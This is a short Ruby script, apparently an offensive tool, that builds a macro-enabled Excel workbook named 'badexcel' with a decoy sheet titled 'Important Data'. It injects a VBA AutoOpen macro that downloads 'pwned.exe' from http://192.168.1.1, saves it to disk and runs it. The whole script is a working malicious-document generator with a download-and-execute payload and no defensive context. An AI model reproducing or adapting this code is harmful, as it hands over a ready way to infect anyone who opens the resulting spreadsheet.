##################
# create excel file that will download...
# ./bad_excel.rb 
##################
require 'win32ole'

def bad_excel(vbs_file, excel_file)
  excel           = WIN32OLE.new('Excel.Application')
  excel.visible   = false
  workbook        = excel.workbooks.add
  worksheet       = workbook.Worksheets(1)
  worksheet.name  = "Important Data"
  code_mod        = workbook.VBProject.VBComponents.Item('TheWorkBook')
  fileformat      = 52

  vbs_file.each_line(chomp: true).with_index do |loc, ln|
    code_mod.CodeModule.InsertLines(ln + 1, loc)
  end

  workbook.SaveAs(excel_file, fileformat)
  excel.ActiveWorkbook.Close(0)
  excel.Quit()
end

vbs = <<~VBSCode
Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://192.168.1.1/pwned.exe", false
xHttp.Send

With bStrm
  .Type = 1 '//binary
  .Open
  .write xHttp.responseBody
  .savetoFile "file.exe", 2 '//overwrite
End With

Shell ("file.exe")

End Sub
VBSCode

bad_excel(vbs, 'badexcel')
